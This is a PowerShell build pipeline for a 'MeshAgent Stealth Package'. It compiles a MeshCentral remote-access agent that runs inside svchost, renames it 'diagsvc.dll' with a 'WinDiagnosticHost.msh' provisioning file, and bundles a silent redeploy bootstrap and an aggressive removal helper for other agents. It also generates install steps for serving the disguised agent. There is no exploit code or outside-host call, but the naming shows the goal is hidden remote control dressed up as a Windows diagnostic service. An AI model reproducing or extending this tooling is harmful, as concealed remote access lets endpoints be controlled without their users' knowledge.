#Requires -RunAsAdministrator
param(
    [switch]$Clean = $false,
    [switch]$SkipBuild = $false,
    [switch]$StrictBranding = $false
)

Set-StrictMode -Version Latest
$ErrorActionPreference = 'Stop'

function Write-Header {
    param([string]$Text)
    Write-Host ""
    Write-Host "========================================" -ForegroundColor Cyan
    Write-Host ("  {0}" -f $Text) -ForegroundColor Cyan
    Write-Host "========================================" -ForegroundColor Cyan
    Write-Host ""
}

function Write-Step {
    param(
        [int]$Index,
        [int]$Total,
        [string]$Label,
        [scriptblock]$Action
    )

    Write-Host ("[{0}/{1}] {2}..." -f $Index, $Total, $Label) -ForegroundColor Yellow
    try {
        & $Action
        Write-Host "    - Completed" -ForegroundColor Green
    }
    catch {
        Write-Host ("    - Failed: {0}" -f $_.Exception.Message) -ForegroundColor Red
        throw
    }
}

function Write-Note {
    param(
        [string]$Message,
        [ConsoleColor]$Color = [ConsoleColor]::Gray
    )
    Write-Host ("    - {0}" -f $Message) -ForegroundColor $Color
}

function Assert-SignedArtifact {
    param(
        [Parameter(Mandatory = $true)][string]$Path,
        [Parameter(Mandatory = $true)][string]$Description
    )

    Assert-MeshAgentSignatureAllowed -Path $Path -AllowedThumbprints $AllowedThumbprints -RequireSignature | Out-Null
    Write-Note ("Signature validated: {0}" -f $Description) ([ConsoleColor]::Green)
}


$projectRoot   = $PSScriptRoot
$msbuildPath   = "C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Current\Bin\MSBuild.exe"
$projectFile   = Join-Path $projectRoot "meshservice\MeshService-2022.vcxproj"
$brandingHeader = Join-Path $projectRoot "meshcore\generated\meshagent_branding.h"
$schemaPath    = Join-Path $projectRoot "schema\meshagent.schema.json"
$configuration = "StealthLab_DLL"
$platform      = "x64"
$dllOutput     = Join-Path $projectRoot "meshservice\x64\StealthLab_DLL\MeshService-2022.dll"
$outputDir     = Join-Path $projectRoot "dist"
$toolsDir      = Join-Path $projectRoot "tools"
$outDir        = Join-Path $projectRoot "out"
$buildOutDir   = Join-Path $outDir "build"
$script:brandingReportPath = Join-Path $buildOutDir "branding_diff_report.json"
$script:brandingWarningCount = 0
$script:verificationDir = $null

# Clean up old distribution artifacts (keep only 3 most recent)
$maxBuildsToKeep = 3
if (Test-Path $outputDir) {
    Write-Host "[INFO] Cleaning old distribution artifacts..." -ForegroundColor Yellow
    $oldBuilds = Get-ChildItem -Path $outputDir -Directory -Filter "MeshAgent_Stealth_*" |
                 Sort-Object CreationTime -Descending |
                 Select-Object -Skip $maxBuildsToKeep

    if ($oldBuilds) {
        foreach ($oldBuild in $oldBuilds) {
            Write-Host "    - Removing old build: $($oldBuild.Name)" -ForegroundColor DarkGray
            Remove-Item -Path $oldBuild.FullName -Recurse -Force
        }

        # Also remove associated ZIP files
        $oldZips = Get-ChildItem -Path $outputDir -File -Filter "MeshAgent_Stealth_*.zip" |
                   Sort-Object CreationTime -Descending |
                   Select-Object -Skip $maxBuildsToKeep

        foreach ($oldZip in $oldZips) {
            Write-Host "    - Removing old ZIP: $($oldZip.Name)" -ForegroundColor DarkGray
            Remove-Item -Path $oldZip.FullName -Force
        }
    }
}
$embedScript   = Join-Path $toolsDir "embed_provisioning_simple.ps1"
$dumpbinPath   = "C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.44.35207\bin\Hostx64\x64\dumpbin.exe"

$signerAllowlistScript = Join-Path $toolsDir "SignerAllowlist.ps1"
if (-not (Test-Path $signerAllowlistScript)) {
    throw "Signer allowlist helper not found at $signerAllowlistScript"
}
. $signerAllowlistScript
$AllowedThumbprints = Get-MeshAgentAllowedThumbprints -RepoRoot $projectRoot


. (Join-Path $toolsDir "ResourceProbe.ps1")
$validateBrandingScript = Join-Path $toolsDir "validate_branding_config.ps1"

if (-not (Test-Path $msbuildPath)) {
    throw "MSBuild not found at '$msbuildPath'. Install Visual Studio build tools or update path."
}

if (-not (Test-Path $projectFile)) {
    throw "Project file not found: $projectFile"
}

if (-not (Test-Path $embedScript)) {
    throw "Provisioning embed script not found: $embedScript"
}

Write-Header "MeshAgent Complete Build Pipeline"

$step = 1
$totalSteps = 10
$buildStopwatch = [System.Diagnostics.Stopwatch]::StartNew()
$script:brandingHeaderStampUtc = $null

Write-Step -Index ($step++) -Total $totalSteps -Label "Embedding provisioning data" -Action {
    Push-Location $toolsDir
    try {
        if (Test-Path $validateBrandingScript) {
            & powershell.exe -NoProfile -ExecutionPolicy Bypass -File $validateBrandingScript -ConfigPath (Join-Path $projectRoot "branding_config.json") -SchemaPath $schemaPath -Quiet
            if ($LASTEXITCODE -ne 0) { throw "Branding configuration validation failed." }
        } else {
            Write-Note "Branding validation script missing; skipping schema checks" ([ConsoleColor]::DarkYellow)
        }
        & powershell.exe -NoProfile -ExecutionPolicy Bypass -File $embedScript
        Write-Note "Provisioning data embedded successfully" ([ConsoleColor]::Green)
        if (-not (Test-Path $brandingHeader)) {
            throw "Branding header expected at $brandingHeader after embedding."
        }
        $script:brandingHeaderStampUtc = (Get-Item $brandingHeader).LastWriteTimeUtc
    }
    finally {
        Pop-Location
    }
}

Write-Step -Index ($step++) -Total $totalSteps -Label "Cleaning build artifacts" -Action {
    if ($Clean) {
        & $msbuildPath $projectFile /t:Clean /p:Configuration=$configuration /p:Platform=$platform /v:minimal | Out-Null
        Write-Note "Clean completed"
    }
    else {
        Write-Note "Skipped (use -Clean to enable)"
    }
}

Write-Step -Index ($step++) -Total $totalSteps -Label "Building stealth DLL" -Action {
    if ($SkipBuild) {
        Write-Note "Skipped (use without -SkipBuild to compile)"
        return
    }

    # Validate branding header timestamp to prevent stale builds
    if (Test-Path $dllOutput) {
        $dllTime = (Get-Item $dllOutput).LastWriteTimeUtc
        if ($script:brandingHeaderStampUtc -and $script:brandingHeaderStampUtc -lt $dllTime) {
            throw "Branding header ($($script:brandingHeaderStampUtc.ToString('yyyy-MM-dd HH:mm:ss'))) is older than existing DLL ($($dllTime.ToString('yyyy-MM-dd HH:mm:ss'))). Provisioning data may be stale. Clean the build or regenerate provisioning."
        }
    }

    $buildTimer = [System.Diagnostics.Stopwatch]::StartNew()
    $buildOutput = & $msbuildPath $projectFile `
        /t:Build `
        /p:Configuration=$configuration `
        /p:Platform=$platform `
        /p:WindowsTargetPlatformVersion=10.0 `
        /m `
        /v:minimal 2>&1

    if ($LASTEXITCODE -ne 0) {
        $errors = $buildOutput | Select-String -Pattern "error"
        if ($errors) {
            $errors | ForEach-Object { Write-Host $_ -ForegroundColor Red }
        }
        throw "MSBuild reported exit code $LASTEXITCODE"
    }

    Write-Note ("Build succeeded in {0:N1}s" -f $buildTimer.Elapsed.TotalSeconds)
}

Write-Step -Index ($step++) -Total $totalSteps -Label "Verifying build output" -Action {
    if (-not (Test-Path $dllOutput)) {
        throw "Expected DLL not found at $dllOutput"
    }

    $dllInfo = Get-Item $dllOutput
    Write-Note ("DLL size: {0:N0} bytes" -f $dllInfo.Length)
    Write-Note ("Timestamp: {0:u}" -f $dllInfo.LastWriteTimeUtc)
    if ($script:brandingHeaderStampUtc -and $dllInfo.LastWriteTimeUtc -lt $script:brandingHeaderStampUtc) {
        throw "MeshService-2022.dll timestamp predates the refreshed branding header. Re-run the build to include updated provisioning."
    }
    Assert-SignedArtifact -Path $dllOutput -Description 'StealthLab_DLL payload'

    if (Test-Path $dumpbinPath) {
        $exports = & $dumpbinPath /EXPORTS $dllOutput 2>&1 | Select-String "Stealth_SvchostServiceMain"
        if ($exports) {
            Write-Note "Export Stealth_SvchostServiceMain verified" ([ConsoleColor]::Green)
        }
        else {
            Write-Note "Warning: Export Stealth_SvchostServiceMain not found" ([ConsoleColor]::Yellow)
        }
    }
    else {
        Write-Note "dumpbin.exe not found; export check skipped" ([ConsoleColor]::DarkGray)
    }
}

Write-Step -Index ($step++) -Total $totalSteps -Label "Removing previous dist packages" -Action {
    if (-not (Test-Path $outputDir)) {
        Write-Note "dist directory not present; nothing to purge" ([ConsoleColor]::DarkGray)
        return
    }
    $existing = Get-ChildItem -Path $outputDir -Filter "MeshAgent_Stealth_*" -ErrorAction SilentlyContinue
    if ($existing) {
        foreach ($item in $existing) {
            try {
                Remove-Item -Path $item.FullName -Recurse -Force -ErrorAction Stop
            } catch {
                Write-Note ("Unable to remove {0}: {1}" -f $item.FullName, $_.Exception.Message) ([ConsoleColor]::Yellow)
            }
        }
        Write-Note "Removed previous MeshAgent_Stealth_* packages from dist" ([ConsoleColor]::Green)
    } else {
        Write-Note "No prior MeshAgent_Stealth_* packages found" ([ConsoleColor]::DarkGray)
    }
}

Write-Step -Index ($step++) -Total $totalSteps -Label "Preparing package contents" -Action {
    if (-not (Test-Path $outputDir)) {
        New-Item -Path $outputDir -ItemType Directory -Force | Out-Null
    }

    $packageName = "MeshAgent_Stealth_{0}" -f (Get-Date -Format 'yyyyMMdd_HHmmss')
    $script:packageDir = Join-Path $outputDir $packageName
    $script:verificationDir = Join-Path $script:packageDir "verification"
    New-Item -Path $script:packageDir -ItemType Directory -Force | Out-Null

    Assert-SignedArtifact -Path $dllOutput -Description 'diagsvc.dll source'
    Copy-Item -Path $dllOutput -Destination (Join-Path $script:packageDir "diagsvc.dll") -Force

    $stealthExeX64 = Join-Path $projectRoot "meshservice\x64\StealthLab\MeshService-2022.exe"
    if (Test-Path $stealthExeX64) {
        if (-not (Test-SvchostPayload -Path $stealthExeX64)) {
            throw "MeshService-2022.exe (x64) missing SVCHOSTDLL resource. Re-run build.ps1 -StealthLab."
        }
        Assert-SignedArtifact -Path $stealthExeX64 -Description 'MeshService-2022.exe (x64)'
        Copy-Item -Path $stealthExeX64 -Destination (Join-Path $script:packageDir "MeshService64.exe") -Force
        Write-Note "Added MeshService64.exe (svchost-enabled executable)"
    }
    else {
        Write-Note "MeshService-2022.exe (x64) missing; MeshService64.exe not included" ([ConsoleColor]::DarkYellow)
    }

    $stealthExeWin32 = Join-Path $projectRoot "meshservice\StealthLab\MeshService-2022.exe"
    if (Test-Path $stealthExeWin32) {
        if (-not (Test-SvchostPayload -Path $stealthExeWin32)) {
            throw "MeshService-2022.exe (Win32) missing SVCHOSTDLL resource. Re-run build.ps1 -StealthLab."
        }
        Assert-SignedArtifact -Path $stealthExeWin32 -Description 'MeshService-2022.exe (Win32)'
        Copy-Item -Path $stealthExeWin32 -Destination (Join-Path $script:packageDir "MeshService.exe") -Force
        Write-Note "Added MeshService.exe (svchost-enabled Win32 executable)"
    }

    $optionalFiles = @(
        @{ Source = Join-Path $projectRoot "WinDiagnosticHost.msh"; Destination = "WinDiagnosticHost.msh"; Description = ".msh provisioning file" },
        @{ Source = Join-Path $projectRoot "deploy_stealth_agent.ps1"; Destination = "install.ps1"; Description = "installer helper script"; Optional = $true },
        @{ Source = Join-Path $projectRoot "branding_config.json"; Destination = "branding_config.json"; Description = "branding configuration" },
        @{ Source = Join-Path $projectRoot "tools\cleanup_old_agents.ps1"; Destination = "tools\cleanup_old_agents.ps1"; Description = "endpoint cleanup helper"; Optional = $true },
        @{ Source = Join-Path $projectRoot "tools\install_agent_bootstrap.ps1"; Destination = "tools\install_agent_bootstrap.ps1"; Description = "local force-update bootstrap"; Optional = $true }
    )

    foreach ($file in $optionalFiles) {
        if (Test-Path $file.Source) {
            $destinationPath = Join-Path $script:packageDir $file.Destination
            $destinationParent = Split-Path $destinationPath -Parent
            if ($destinationParent -and -not (Test-Path $destinationParent)) {
                New-Item -ItemType Directory -Path $destinationParent -Force | Out-Null
            }
            Copy-Item -Path $file.Source -Destination $destinationPath -Force
            Write-Note ("Added {0}" -f $file.Description)
        }
        elseif (-not $file.Optional) {
            throw "Required file missing: $($file.Source)"
        }
        else {
            Write-Note ("Optional file missing: {0}" -f $file.Source) ([ConsoleColor]::DarkGray)
        }
    }

    $dllInfo = Get-Item $dllOutput
    $win32ReadmeLine = ""
    if (Test-Path (Join-Path $script:packageDir "MeshService.exe")) {
        $win32ReadmeLine = "- MeshService.exe          : svchost-enabled service executable (Win32)`n"
    }
    $readme = @"
MeshAgent Stealth Package
=========================

Built: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
DLL Size: $($dllInfo.Length) bytes

INSTALLATION NOTES
------------------
1. Upload diagsvc.dll to your MeshCentral agents-custom directory.
2. Rename it to meshagent_win32_x64.exe.
3. Restart the MeshCentral service.
4. Download the agent from the MeshCentral portal.

FILES
-----
- diagsvc.dll              : MeshAgent svchost payload
- MeshService64.exe        : svchost-enabled service executable (x64)
${win32ReadmeLine}- WinDiagnosticHost.msh    : Provisioning data
- install.ps1              : Optional local installer helper
- tools\cleanup_old_agents.ps1 : Aggressive legacy agent removal helper
- tools\install_agent_bootstrap.ps1 : Optional silent redeploy bootstrap
- branding_config.json     : Branding configuration used for the build

"@

    $readme | Out-File -FilePath (Join-Path $script:packageDir "README.txt") -Encoding UTF8
    Write-Note ("Package directory: {0}" -f $script:packageDir)
}

Write-Step -Index ($step++) -Total $totalSteps -Label "Running verification suite" -Action {
    $testScript = Join-Path $projectRoot "test.ps1"
    $verificationDir = $script:verificationDir
    if (-not $verificationDir) {
        $verificationDir = Join-Path $script:packageDir "verification"
        $script:verificationDir = $verificationDir
    }
    if (-not (Test-Path $testScript)) {
        if (-not (Test-Path $verificationDir)) {
            New-Item -ItemType Directory -Path $verificationDir -Force | Out-Null
        }
        $skipLog = Join-Path $verificationDir "verify-log.txt"
        Write-Note "test.ps1 not found; skipping automated verification" ([ConsoleColor]::DarkYellow)
        "Verification skipped: test.ps1 not found" | Out-File -FilePath $skipLog -Encoding UTF8
        return
    }

    if (-not (Test-Path $verificationDir)) {
        New-Item -ItemType Directory -Path $verificationDir -Force | Out-Null
    }

    $verificationLog = Join-Path $verificationDir "verify-log.txt"
    $verificationReport = Join-Path $verificationDir "verify-report.json"

    $testArgs = @(
        '-NoProfile',
        '-ExecutionPolicy','Bypass',
        '-File', $testScript,
        '-BinaryPath', $script:packageDir,
        '-ReportPath', $verificationReport
    )
    Write-Note "Executing regression tests against packaged binaries"
    & powershell.exe $testArgs 2>&1 | Tee-Object -FilePath $verificationLog | Out-Null
    if ($LASTEXITCODE -ne 0) {
        throw "Regression tests failed. See verification/verify-log.txt for details."
    }
    Write-Note ("Verification artifacts written to {0}" -f ($verificationDir.Substring($projectRoot.Length).TrimStart('\','/'))) ([ConsoleColor]::Green)
}

Write-Step -Index ($step++) -Total $totalSteps -Label "Analyzing branding drift" -Action {
    if (-not (Test-Path $script:packageDir)) {
        Write-Note "Package directory missing; skipping branding drift analysis" ([ConsoleColor]::DarkYellow)
        return
    }

    if (-not (Test-Path $validateBrandingScript)) {
        Write-Note "Branding validation script missing; skipping branding drift analysis" ([ConsoleColor]::DarkYellow)
        return
    }

    $binaryCandidates = @(
        (Join-Path -Path $script:packageDir -ChildPath "diagsvc.dll")
        (Join-Path -Path $script:packageDir -ChildPath "MeshService64.exe")
        (Join-Path -Path $script:packageDir -ChildPath "MeshService.exe")
        (Join-Path -Path $script:packageDir -ChildPath "MeshServiceHost64.dll")
    )

    $existingBinaries = @()
    foreach ($candidate in $binaryCandidates) {
        if (Test-Path $candidate) {
            $existingBinaries += $candidate
        }
    }

    if ($existingBinaries.Count -eq 0) {
        Write-Note "No binaries staged for branding drift analysis" ([ConsoleColor]::DarkGray)
        return
    }

    if (-not (Test-Path $buildOutDir)) {
        New-Item -ItemType Directory -Path $buildOutDir -Force | Out-Null
    }

    $binaryArg = [string]::Join(';', $existingBinaries)

    $validationArgs = @(
        '-NoProfile',
        '-ExecutionPolicy','Bypass',
        '-File', $validateBrandingScript,
        '-ConfigPath', (Join-Path $projectRoot "branding_config.json"),
        '-SchemaPath', $schemaPath,
        '-Quiet',
        '-ReportPath', $script:brandingReportPath,
        '-BinaryPaths', $binaryArg
    )

    & powershell.exe $validationArgs
    if ($LASTEXITCODE -ne 0) {
        throw "Branding drift validation failed."
    }

    $warningCount = 0
    if (Test-Path $script:brandingReportPath) {
        try {
            $report = Get-Content -Path $script:brandingReportPath -Raw | ConvertFrom-Json -Depth 6
            if ($report -and $report.warningCount) {
                $warningCount = [int]$report.warningCount
            }
        } catch {
            Write-Note ("Unable to parse branding diff report: {0}" -f $_.Exception.Message) ([ConsoleColor]::DarkYellow)
        }

        $script:brandingWarningCount = $warningCount

        $verificationDir = $script:verificationDir
        if (-not $verificationDir) {
            $verificationDir = Join-Path $script:packageDir "verification"
            $script:verificationDir = $verificationDir
        }
        if (-not (Test-Path $verificationDir)) {
            New-Item -ItemType Directory -Path $verificationDir -Force | Out-Null
        }

        Copy-Item -Path $script:brandingReportPath -Destination (Join-Path $verificationDir "branding_diff_report.json") -Force

        $relativeReport = if ($script:brandingReportPath.StartsWith($projectRoot)) {
            $script:brandingReportPath.Substring($projectRoot.Length).TrimStart('\','/')
        } else {
            $script:brandingReportPath
        }
        Write-Note ("Branding diff report captured at {0}" -f $relativeReport) ([ConsoleColor]::Green)
    } else {
        Write-Note "Branding diff report not produced; skipping copy to verification artifacts" ([ConsoleColor]::DarkYellow)
    }

    if ($warningCount -gt 0) {
        Write-Note ("Branding drift warnings detected: {0}" -f $warningCount) ([ConsoleColor]::DarkYellow)
        if ($StrictBranding) {
            throw ("Branding drift detected ({0} warning(s))." -f $warningCount)
        }
    } else {
        Write-Note "Branding drift checks passed (no warnings)" ([ConsoleColor]::Green)
    }
}

Write-Step -Index ($step++) -Total $totalSteps -Label "Computing bundle digest" -Action {
    if (-not (Test-Path $script:packageDir)) {
        throw "Package directory missing: $script:packageDir"
    }

    $bundleName = Split-Path -Path $script:packageDir -Leaf
    $files = Get-ChildItem -Path $script:packageDir -File -Recurse | Sort-Object FullName
    if (-not $files) {
        throw "No files found in package directory $script:packageDir"
    }

    $digestLines = New-Object System.Collections.Generic.List[string]
    $manifest = [ordered]@{
        bundle = $bundleName
        createdUtc = (Get-Date).ToUniversalTime().ToString("o")
        packageDir = $script:packageDir
        signerEnforcement = [bool]$script:MeshAgentEnforceSigning
        files = @()
    }
    $signerWarnings = New-Object System.Collections.Generic.List[string]

    foreach ($file in $files) {
        $relativePath = $file.FullName.Substring($script:packageDir.Length + 1)
        $normalizedPath = $relativePath -replace '\\','/'
        $hash = (Get-FileHash -Path $file.FullName -Algorithm SHA256).Hash
        $digestLines.Add("{0} *{1}" -f $hash, $normalizedPath)

        $entry = [ordered]@{
            path = $normalizedPath
            size = [int64]$file.Length
            sha256 = $hash
        }

        if ($file.Extension -match '(?i)\.(dll|exe)$') {
            $enforce = [bool]$script:MeshAgentEnforceSigning
            $thumbprint = $null
            if ($enforce) {
                try {
                    Assert-MeshAgentSignatureAllowed -Path $file.FullName -AllowedThumbprints $AllowedThumbprints -RequireSignature:$true | Out-Null
                    $thumbprint = Get-MeshAgentSignerThumbprint -Path $file.FullName
                    if (-not $thumbprint) {
                        throw "Signer thumbprint unavailable after enforcement check."
                    }
                    $entry['signatureStatus'] = "allowlisted"
                } catch {
                    $signerWarnings.Add("Signature enforcement failure for ${normalizedPath}: $($_.Exception.Message)")
                    throw
                }
            } else {
                try {
                    $thumbprint = Get-MeshAgentSignerThumbprint -Path $file.FullName
                } catch {
                    $signerWarnings.Add("Signature inspection failed for ${normalizedPath}: $($_.Exception.Message)")
                }

                if ($thumbprint) {
                    if ($AllowedThumbprints -and -not ($AllowedThumbprints -contains $thumbprint)) {
                        $signerWarnings.Add("Signer $thumbprint for ${normalizedPath} not in allowlist")
                        $entry['signatureStatus'] = "signed-unlisted"
                    } else {
                        $entry['signatureStatus'] = "allowlisted"
                    }
                } else {
                    $entry['signatureStatus'] = "unsigned"
                    $signerWarnings.Add("Unsigned binary: ${normalizedPath}")
                }
            }

            if ($thumbprint) {
                $entry['signed'] = $true
                $entry['signerThumbprint'] = $thumbprint
            } else {
                $entry['signed'] = $false
            }
        }

        $manifest.files += [PSCustomObject]$entry

        if ($normalizedPath -ieq "diagsvc.dll") {
            $script:dllHash = $hash
        }
    }

    if ($signerWarnings.Count -gt 0) {
        $manifest['signerWarnings'] = $signerWarnings
    }

    $bundleDigestName = "{0}.sha256" -f $bundleName
    $bundleManifestName = "{0}-manifest.json" -f $bundleName
    $digestPath = Join-Path $script:packageDir $bundleDigestName
    $manifestPath = Join-Path $script:packageDir $bundleManifestName

    $digestLines | Out-File -FilePath $digestPath -Encoding ASCII
    $manifest | ConvertTo-Json -Depth 6 | Out-File -FilePath $manifestPath -Encoding UTF8

    Copy-Item -Path $digestPath -Destination (Join-Path $outputDir $bundleDigestName) -Force
    Copy-Item -Path $manifestPath -Destination (Join-Path $outputDir $bundleManifestName) -Force

    Write-Note ("Digest catalogued {0} files" -f $files.Count) ([ConsoleColor]::Green)
    if ($signerWarnings.Count -gt 0 -and -not $script:MeshAgentEnforceSigning) {
        foreach ($warning in $signerWarnings) {
            Write-Note ("Signer warning: {0}" -f $warning) ([ConsoleColor]::DarkYellow)
        }
    }
}

Write-Step -Index ($step++) -Total $totalSteps -Label "Creating archive" -Action {
    $zipName = "{0}.zip" -f (Split-Path $script:packageDir -Leaf)
    $script:zipPath = Join-Path $outputDir $zipName
    Compress-Archive -Path (Join-Path $script:packageDir "*") -DestinationPath $script:zipPath -Force
    $zipSize = (Get-Item $script:zipPath).Length
    Write-Note ("Archive created: {0} ({1:N2} MB)" -f $script:zipPath, ($zipSize / 1MB))
}

$buildStopwatch.Stop()

Write-Host ""
Write-Host "========================================" -ForegroundColor Green
Write-Host "  BUILD COMPLETE" -ForegroundColor Green
Write-Host "========================================" -ForegroundColor Green
Write-Host ""
Write-Host ("Package folder : {0}" -f $script:packageDir) -ForegroundColor Cyan
Write-Host ("Archive        : {0}" -f $script:zipPath) -ForegroundColor Cyan
Write-Host ("Elapsed time   : {0:N1}s" -f $buildStopwatch.Elapsed.TotalSeconds) -ForegroundColor Cyan
if ($script:dllHash) {
    Write-Host ("DLL SHA256     : {0}" -f $script:dllHash) -ForegroundColor Gray
}
if ($script:brandingWarningCount -gt 0) {
    Write-Host ("Branding warnings: {0}" -f $script:brandingWarningCount) -ForegroundColor Yellow
    if (-not $StrictBranding) {
        Write-Host "Re-run with -StrictBranding to treat branding drift as an error." -ForegroundColor DarkYellow
    }
}
Write-Host ""
Write-Host "Next steps:" -ForegroundColor Yellow
Write-Host "1. Upload diagsvc.dll to the MeshCentral agents-custom directory." -ForegroundColor White
Write-Host "2. For executable overrides, use MeshService64.exe (and MeshService.exe if required) in meshcentral-data\agents." -ForegroundColor White
Write-Host "3. Restart the MeshCentral service and download the agent." -ForegroundColor White
Write-Host ""
